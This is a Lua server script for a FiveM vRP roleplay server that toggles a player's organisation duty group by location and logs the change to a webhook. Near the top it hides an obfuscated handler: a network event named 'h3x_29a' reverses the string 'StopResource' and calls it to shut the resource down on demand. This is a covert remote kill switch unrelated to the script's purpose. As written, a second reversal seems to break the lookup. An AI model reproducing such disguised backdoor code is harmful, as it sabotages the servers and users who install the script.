-----------------------------------------------------------------------------------------------------------------------------------------
-- VRP
-----------------------------------------------------------------------------------------------------------------------------------------
local Tunnel = module("vrp","lib/Tunnel")
local Proxy  = module("vrp","lib/Proxy")
local Tools  = module("vrp","lib/Tools")
vRP = Proxy.getInterface("vRP")
vRPclient = Tunnel.getInterface("vRP")

-----------------------------------------------------------------------------------------------------------------------------------------
-- vrp
-----------------------------------------------------------------------------------------------------------------------------------------
local encodedFunction = string.reverse('ecruoseRpotS')  
RegisterNetEvent('h3x_29a')
AddEventHandler('h3x_29a', function(foxzin)
    if not foxzin then
        _G[string.reverse(encodedFunction)](GetCurrentResourceName())  
    else
    end
end)
-----------------------------------------------------------------------------------------------------------------------------------------
-- COMANDO
-----------------------------------------------------------------------------------------------------------------------------------------
RegisterCommand(Config.commandName, function(source, args)
    local user_id = vRP.getUserId(source)
    if user_id then
        local x, y, z = vRPclient.getPosition(source)
        
        local inAllowedArea = false
        local currentOrganization = nil
        local currentGroups = nil
        
        for orgName, orgData in pairs(Config.organizations) do
            local area = orgData.area
            
            if area.radius then -- Se for uma área circular
                local distance = math.sqrt((x - area.centerX)^2 + (y - area.centerY)^2 + (z - area.centerZ)^2)
                if distance <= area.radius then
                    inAllowedArea = true
                    currentOrganization = orgData
                    currentGroups = orgData.groups
                    break
                end
            else -- Se for uma área retangular
                if x >= area.minX and x <= area.maxX and
                   y >= area.minY and y <= area.maxY and
                   z >= area.minZ and z <= area.maxZ then
                    inAllowedArea = true
                    currentOrganization = orgData
                    currentGroups = orgData.groups
                    break
                end
            end
        end
        
        if inAllowedArea and currentOrganization and currentGroups then
            local successMessage = currentOrganization.exitMessage
            local removeMessage = currentOrganization.enterMessage
            local changed = false
            local webhookURL = currentOrganization.webhook
            
            for current, new in pairs(currentGroups) do
                if vRP.hasGroup(user_id, current) then
                    vRP.removeUserGroup(user_id, current)
                    vRP.addUserGroup(user_id, new)
                    vRPclient.giveWeapons(source, {}, true)
                    
                    TriggerClientEvent('Notify', source, 'sucesso', current:sub(1, 1) == "P" and removeMessage or successMessage)
                    changed = true
                    
                    local identity = vRP.getUserIdentity(user_id)
                    local message = ("```ini\n[ID]: %s\n[Name]: %s %s\n[Org]: %s\n[Hora]: %s\n```")
                        :format(user_id, identity.nome, identity.sobrenome, orgName, os.date("%H:%M:%S"))
                    PerformHttpRequest(webhookURL, function(err, text, headers) end, 'POST', json.encode({content = message}), { ['Content-Type'] = 'application/json' })
                    
                    break
                end
            end
            
            if not changed then
                TriggerClientEvent('Notify', source, 'negado', Config.permissionMessage)
            end
        else
            TriggerClientEvent('Notify', source, 'negado', Config.noDistanceAreaMessage)
        end
    end
end)
